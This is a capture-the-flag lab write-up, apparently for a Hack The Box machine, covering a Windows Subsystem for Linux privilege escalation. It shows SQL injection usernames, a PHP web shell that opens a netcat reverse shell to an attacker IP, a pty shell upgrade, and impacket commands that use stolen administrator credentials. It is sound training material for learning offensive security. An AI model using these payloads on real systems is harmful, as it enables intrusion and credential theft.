# Escalation Path: Windows Subsystem for Linux

### Overview

Using HTB SecNotes - write up here: https://github.com/lukepatterson31/htb/tree/main/machines/secnotes/secnotes.md

Involves techniques from [PayloadsAllTheThings Windows Privesc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---windows-subsystem-for-linux-wsl)

### Gaining a Foothold

The username parameter is vulnerable to SQLi, when registering a new user use the username `' OR 1=1;#` or
`'OR 1 OR'`. Log in as the new user to see all notes, one of them contains SMB credentials for tyler.

The SMB share is the root directory for the web server on port 8808. Uploading .asp or .aspx files doesn't 
work but .php files do.

Upload a static Windows netcat binary and a basic php shell that will execute the netcat binary

```
# rev.php
<?php system('nc.exe -e cmd.exe 10.10.10.2 4444); ?>
```
Start a netcat listener and navigate to the php shell. This gives us a reverse shell as tyler

### Escalation via WSL

Look for bash.exe/wsl.exe:

```
where /R C:\Windows bash.exe
where /R C:\Windows wsl.exe
```

Run bash.exe to get a linux prompt then upgrade your shell with python:

`python -c 'import pty;pty.spawn("/bin/bash")'`

Do some basic enumeration, check history, sudo -l, etc.

Find the administrator credentials in root history and use impacket tools to get a remote shell as system

```
psexec.py administrator:'password'@10.10.10.97
smbexec.py administrator:'password'@10.10.10.97
wmiexec.py administrator:'password'@10.10.10.97
```
